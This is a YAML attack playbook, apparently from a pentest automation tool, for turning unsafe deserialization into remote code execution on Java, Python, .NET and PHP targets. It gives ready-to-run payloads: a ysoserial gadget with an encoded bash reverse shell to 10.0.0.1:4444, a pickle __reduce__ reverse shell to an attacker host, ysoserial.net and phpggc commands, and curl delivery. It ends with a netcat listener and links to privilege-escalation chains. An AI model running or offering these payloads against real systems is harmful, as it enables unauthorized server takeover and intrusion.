id: deserialization-attacks
name: "Web — Unsafe deserialization → RCE (Java / Python / .NET / PHP)"
description: >
  Application deserializes attacker-controlled blobs without integrity
  checks. Use a known gadget chain for the framework (ysoserial for Java,
  pickle for Python, ysoserial.net for .NET, phpggc for PHP) → RCE on
  unmarshal.
tags: [web, deserialization, rce, java, python, dotnet, php]
difficulty: hard

inputs:
  - name: target_url
    description: "Endpoint that consumes serialized data (often cookies, hidden inputs, message queues, API bodies)."
    required: true

steps:
  - id: identify_format
    name: "Identify the serialization format"
    inline_command: "echo 'Look at intercepted requests/cookies. Common markers:\n  Java:    rO0AB / `\\xac\\xed` magic\n  Python:  base64 starting with `gASV` (pickle) or yaml.load() params\n  .NET:    AAEAAAD / base64 `BinaryFormatter`\n  PHP:     `O:<n>:\"ClassName\":<n>:{...}` serialize() format\n  Ruby:    `\\x04\\x08` Marshal magic'"

  - id: java_ysoserial
    name: "Java — ysoserial gadget"
    inline_command: |
      # Pick a gadget chain matching the app's classpath. CommonsCollections1
      # / 5 / 6 / 7 are usually winners on legacy Spring/Struts. Generate:
      java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > payload.bin
      # Deliver (cookie, body, header — wherever the deserialization happens):
      curl -X POST '<url>' --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object'
    inputs:
      url: "${target_url}"
    notes: |
      For Spring/SpEL bugs (CVE-2022-22963 / 22965), use the dedicated
      SpringShell payload. For Apache Commons Text (CVE-2022-42889), the
      "Text4Shell" prefix `${script:javascript:...}` lands in any logged
      string.

  - id: python_pickle
    name: "Python — pickle RCE"
    inline_command: |
      python3 -c '
      import pickle, base64
      class P:
          def __reduce__(self):
              return (__import__("os").system, ("bash -c \"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"",))
      print(base64.b64encode(pickle.dumps(P())).decode())'
      # Send the base64 to the endpoint that pickle.loads() it.
    inputs:
      lhost: "${attacker_ip}"
      lport: "4444"
    notes: |
      Common contexts: Celery task queues, Flask sessions when
      SECRET_KEY is known/leaked, YAML loaders using yaml.load (vs
      yaml.safe_load).

  - id: dotnet_ysoserial
    name: ".NET — ysoserial.net"
    inline_command: |
      ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
      # Common gadgets: ObjectDataProvider, TypeConfuseDelegate, ActivitySurrogateSelector.
      # Common formatters: BinaryFormatter, NetDataContractSerializer, ObjectStateFormatter (Viewstate!).

  - id: php_phpggc
    name: "PHP — phpggc"
    inline_command: |
      phpggc Symfony/RCE4 system 'id' -b
      # Output is base64-encoded serialized payload. Inject where the app
      # unserializes — cookies, URL params, POST bodies, X-Forwarded-For
      # headers used by app routers, etc.

  - id: confirm_rce
    name: "Catch the reverse shell"
    inline_command: "nc -lvnp <lport>"
    inputs:
      lport: "4444"

references:
  - title: "ysoserial (Java)"
    url:   "https://github.com/frohoff/ysoserial"
  - title: "ysoserial.net"
    url:   "https://github.com/pwntester/ysoserial.net"
  - title: "phpggc"
    url:   "https://github.com/ambionics/phpggc"
  - title: "HackTricks — Deserialization"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html"

next_chains:
  - chain: shell-stabilization
    when:   'reverse shell received'
    reason: 'Stabilize.'
  - chain: linux-priv-esc-recon
    when:   'shell on Linux app server'
    reason: 'Escalate.'
  - chain: windows-priv-esc-recon
    when:   'shell on Windows IIS / Tomcat'
    reason: 'AppPool → SeImpersonate path.'
